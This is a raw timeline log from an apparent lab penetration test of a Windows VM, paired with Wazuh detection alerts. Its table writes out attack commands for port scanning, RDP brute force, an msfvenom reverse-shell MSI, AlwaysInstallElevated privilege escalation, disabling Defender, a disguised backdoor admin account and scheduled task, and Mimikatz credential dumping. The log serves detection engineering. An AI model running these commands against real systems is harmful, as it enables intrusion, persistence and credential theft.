# Attack Log: Full Timeline

All times **Africa/Cairo (UTC+2)**, 2026-11-03. This is the raw engagement log;
narrative context and screenshots are in the
[pentest report](../reports/pentest-report.md).

> **Time-zone note:** The Wazuh dashboard initially showed times ~10 hours off
> (default Pacific zone). The Windows time zone was corrected to Cairo mid-session;
> all times below are aligned to Cairo. If a screenshot timestamp looks off, this
> is why.

| # | Time | Machine | Action | Result | ATT&CK |
|---|------|---------|--------|--------|--------|
| 1 | 16:38 | Kali | `nmap -Pn -sC -sV -p- 10.0.2.15` | 3389/RDP + 7680 open; host `DESKTOP-RVJTQU1` | T1046 |
| 2 | 16:56 | Kali | `nxc rdp 10.0.2.15 -u jsmith -p small.txt` | Failed (NetExec RDP module unreliable) | T1110.001 |
| 3 | 17:29 | Kali | `hydra -l jsmith -P small.txt rdp://10.0.2.15` | Locked `jsmith` (default lockout); host bluescreened | T1110.001 |
| 4 | 17:45 | Windows | unlock `jsmith`; `net accounts /lockoutthreshold:0` | Lockout disabled (to proceed) | - |
| 5 | 18:07 | Kali | `xfreerdp3 /u:jsmith /p:password123 /v:10.0.2.15 /cert:ignore` | RDP login as `jsmith` | T1078, T1021.001 |
| 6 | 18:24 | Windows (jsmith) | `whoami /groups` | Medium integrity, non-admin | T1033 |
| 7 | 18:27 | Windows (jsmith) | `reg query ...\Windows\Installer` (HKLM + HKCU) | `AlwaysInstallElevated = 0x1` in both | T1012 |
| 8 | 18:30 | Kali | `msfvenom ... shell_reverse_tcp LPORT=4444 -f msi -o setup.msi` | Built malicious MSI | T1587.001 |
| 9 | 18:34 | Windows (jsmith) | `certutil ... setup.msi` | Defender detected & deleted it (genuine detection) | T1105 |
| 10 | 18:36 | Windows | Disabled Defender real-time protection + added exclusion | AV out of the way (test scoping) | T1562.001 |
| 11 | 18:39 | Windows (jsmith) | `msiexec /quiet /qn /i setup.msi` | SYSTEM reverse shell (`whoami = nt authority\system`) | T1548.002, T1218.007 |
| 12 | 18:45 | Windows (SYSTEM) | `net user svc_backup /add` + Administrators; `schtasks "OneDrive Sync Helper"` (onlogon, SYSTEM) | Backdoor admin + scheduled task | T1136.001, T1053.005 |
| 13 | 19:08 | Windows (SYSTEM) | `m.exe "privilege::debug" "sekurlsa::logonpasswords"` | Dumped NTLM hashes (`jsmith`, `Virtual`) | T1003.001 |
| 14 | 19:20 | Kali | `john --format=NT jsmith.hash` | Cracked `jsmith` -> `password123` | T1110.002 |

## Corresponding Wazuh alerts (blue-team side)

| Time | Alert | Rule | Level |
|------|-------|------|:-----:|
| 18:41:26 | Administrators Group Changed, `svc_backup` added to admins | 60154 | 12 |
| 18:24-19:11 | Executable file dropped in `Users\Public` / malware-common folder | 92207 / 92213 | 12-15 |
| 18:44-19:11 | CertUtil.exe launched with commands to download | 92075 | 12 |
| 21:58:19 | Credential dumping tool (Mimikatz) command detected *(custom rule, Phase-5 re-run)* | 100101 | 15 |

## Friction encountered (methodical troubleshooting)

- **NetExec RDP module failed** -> switched to Hydra.
- **Hydra was slow/noisy**, tripped Windows' default **account lockout**, and a
  heavy run **bluescreened the host** -> documented as a real finding; proceeded
  with the known lab password after disabling lockout.
- **Defender detected and deleted the first payload** (genuine AV win) ->
  disabled real-time protection to scope the SIEM-only test.
- **Sysmon ProcessAccess (event 10) was unreliable** for LSASS-access logging ->
  pivoted to a command-line detection rule (see
  [`../detection/local_rules.xml`](../detection/local_rules.xml)).
